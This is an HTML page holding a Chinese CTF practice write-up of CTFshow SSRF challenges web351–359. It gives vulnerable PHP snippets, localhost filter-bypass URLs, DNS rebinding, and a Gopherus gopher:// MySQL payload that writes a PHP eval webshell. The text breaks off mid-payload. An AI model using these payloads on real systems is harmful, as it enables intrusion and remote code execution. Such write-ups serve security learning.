@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web3511234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url&#x3D;$_POST[&amp;#x27;url&amp;#x27;];$ch&#x3D;curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Practice - CTFSHOW WEB入门 SSRF篇">
+<meta property="og:url" content="https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/index.html">
+<meta property="og:site_name" content="Recharging Runtime">
+<meta property="og:description" content="web3511234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url&#x3D;$_POST[&amp;#x27;url&amp;#x27;];$ch&#x3D;curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-06-10T04:12:21.000Z">
+<meta property="article:modified_time" content="2022-06-18T14:55:32.368Z">
+<meta property="article:author" content="b_y">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Practice">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Practice - CTFSHOW WEB入门 SSRF篇</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Recharging Runtime" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/06/11/ctfshow-web-getting-started-ssti/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/06/10/ctfshow-web-getting-started-jwt/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&text=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&title=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&is_video=false&description=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 SSRF篇&body=Check out this article: https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&title=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&title=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&title=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&title=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&name=Practice - CTFSHOW WEB入门 SSRF篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/10/ctfshow-web-getting-started-ssrf/&t=Practice - CTFSHOW WEB入门 SSRF篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web351"><span class="toc-number">1.</span> <span class="toc-text">web351</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web352-353"><span class="toc-number">2.</span> <span class="toc-text">web352-353</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web354"><span class="toc-number">3.</span> <span class="toc-text">web354</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web355-356"><span class="toc-number">4.</span> <span class="toc-text">web355-356</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web357"><span class="toc-number">5.</span> <span class="toc-text">web357</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web358"><span class="toc-number">6.</span> <span class="toc-text">web358</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web359"><span class="toc-number">7.</span> <span class="toc-text">web359</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web360"><span class="toc-number">8.</span> <span class="toc-text">web360</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Practice - CTFSHOW WEB入门 SSRF篇
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">b_y</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-10T04:12:21.000Z" itemprop="datePublished">2022-06-10</time>
+        
+        (Updated: <time datetime="2022-06-18T14:55:32.368Z" itemprop="dateModified">2022-06-18</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Practice/" rel="tag">Practice</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>考的是 <code>ssrf</code>，考虑 <code>flag</code> 需要本地访问才可以得到。访问 <code>flag.php</code> 可以看到提示 <code>非本地用户禁止访问</code>。<br>试了下 gopher fastcgi 没打通<br>payload: <code>url=http://localhost/flag.php</code><br><code>curl</code> 支持多种协议，其中就包括 <code>file://</code>，可以直接读文件输出。<br>payload: <code>url=file:///var/www/html/flag.php</code>  </p>
+<h2 id="web352-353"><a href="#web352-353" class="headerlink" title="web352-353"></a>web352-353</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113853929">https://blog.csdn.net/rfrder/article/details/113853929</a></p>
+<ul>
+<li>进制绕过 url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a></li>
+<li>0.0.0.0绕过 url=<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></li>
+<li>使用句号绕过：url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php%EF%BC%8C%E8%BF%99%E9%A2%98%E4%B9%9F%E4%B8%8D%E8%A1%8C%E3%80%82">http://127。0。0。1/flag.php，这题也不行。</a></li>
+<li>特殊的地址0，url=<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php%EF%BC%8C%E8%BF%98%E6%9C%89url=http://127.1/flag.php,%E8%BF%98%E6%9C%89url=http://127.0000000000000.001/flag.php%E8%BF%99%E6%A0%B7%E7%9A%84%E3%80%82">http://0/flag.php，还有url=http://127.1/flag.php,还有url=http://127.0000000000000.001/flag.php这样的。</a>  </li>
+</ul>
+</blockquote>
+<h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><p>解析一个域名到 127.0.0.1<br>payload: <code>url=http://home.477.moe/flag.php</code>  </p>
+<h2 id="web355-356"><a href="#web355-356" class="headerlink" title="web355-356"></a>web355-356</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload: <code>url=http://0/flag.php</code><br>没活了可以咬打火机  </p>
+<h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><p>dns 重绑定或写个 php 重定向到 <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a><br>DNS Rebinding: <a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</a> 可以让同一个域名随机指向两个 ip  </p>
+<h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload: <code>url=http://ctf.@0/flag.php#show</code>  </p>
+<h2 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h2><p>提示打 mysql  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python2 gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \</span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><br><span class="line">        \/       |__|        \/     \/                 \/</span><br><span class="line"></span><br><span class="line">                author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line">For making it work username should not be password protected!!!</span><br><span class="line"></span><br><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select 0x3c3f706870206576616c28245f504f53545b315d293b203f3e into outfile <span class="string">&#x27;/var/www/html/sh.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Your gopher <span class="built_in">link</span> is ready to <span class="keyword">do</span> SSRF :</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%61%00%00%00%03%73%65%6c%65%63%74%20%30%78%33%63%33%66%37%30%36%38%37%30%32%30%36%35%37%36%36%31%36%63%32%38%32%34%35%66%35%30%34%66%35%33%35%34%35%62%33%31%35%64%32%39%33%62%32%30%33%66%33%65%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%2e%70%68%70%27%3b%01%00%00%00%01</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure>
+<p>/_后还需要一层 url 编码  </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/check.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac1854c8-c19c-4d74-86c1-9ba10f2164af.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2500</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://ac1854c8-c19c-4d74-86c1-9ba10f2164af.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ac1854c8-c19c-4d74-86c1-9ba10f2164af.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>__e_inc=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">u</span>=Username&amp;returl=gopher://<span class="number">127.0.0.1:3306</span>/_%<span class="number">25</span>%<span class="number">61</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">38</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">61</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">66</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">30</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">35</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span 